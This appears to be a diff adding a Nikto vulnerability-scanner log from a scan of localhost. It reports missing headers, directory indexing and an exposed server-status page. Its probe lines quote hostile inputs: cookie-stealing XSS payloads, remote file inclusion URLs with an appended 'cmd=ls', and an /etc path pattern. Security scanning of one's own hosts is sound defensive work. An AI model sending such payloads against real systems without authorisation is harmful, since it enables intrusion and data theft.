@@ -1,0 +1,37 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: localhost
++ Target Port: 80
++ GET /: The anti-clickjacking X-Frame-Options header is not present.
++ -3268: GET /: /: Directory indexing found.
++ OPTIONS /: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ -3268: GET /./: /./: Directory indexing found.
++ -3268: GET /?mod=node&nid=some_thing&op=view: /?mod=node&nid=some_thing&op=view: Directory indexing found.
++ -3268: GET /?mod=some_thing&op=browse: /?mod=some_thing&op=browse: Directory indexing found.
++ GET /./: /./: Appending '/./' to a directory allows indexing
++ -3268: GET //: //: Directory indexing found.
++ GET //: //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
++ -3268: GET /?Open: /?Open: Directory indexing found.
++ -3268: GET /?OpenServer: /?OpenServer: Directory indexing found.
++ -3268: GET /%2e/: /%2e/: Directory indexing found.
++ -576: GET /%2e/: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. BID-2513.
++ -3268: GET /?mod=<script>alert(document.cookie)</script>&op=browse: /?mod=<script>alert(document.cookie)</script>&op=browse: Directory indexing found.
++ -3268: GET /?sql_debug=1: /?sql_debug=1: Directory indexing found.
++ -3268: GET ///: ///: Directory indexing found.
++ -561: GET /server-status: /server-status: This reveals Apache information. Comment out appropriate line in httpd.conf or restrict access to allowed hosts.
++ -3268: GET /?PageServices: /?PageServices: Directory indexing found.
++ -119: GET /?PageServices: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
++ -3268: GET /?wp-cs-dump: /?wp-cs-dump: Directory indexing found.
++ -119: GET /?wp-cs-dump: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
++ -3268: GET ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
++ -3288: GET ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
++ -3268: GET /?pattern=/etc/*&sort=name: /?pattern=/etc/*&sort=name: Directory indexing found.
++ -3268: GET /?D=A: /?D=A: Directory indexing found.
++ -3268: GET /?N=D: /?N=D: Directory indexing found.
++ -3268: GET /?S=A: /?S=A: Directory indexing found.
++ -3268: GET /?M=A: /?M=A: Directory indexing found.
++ -3268: GET /?\"><script>alert('Vulnerable');</script>: /?\"><script>alert('Vulnerable');</script>: Directory indexing found.
++ -3268: GET /?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: /?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: Directory indexing found.
++ -3268: GET /?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: /?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
++ -3268: GET /?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: /?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
++ -3268: GET /?show=http://cirt.net/rfiinc.txt??: /?show=http://cirt.net/rfiinc.txt??: Directory indexing found.
++ -3268: GET /?-s: /?-s: Directory indexing found.
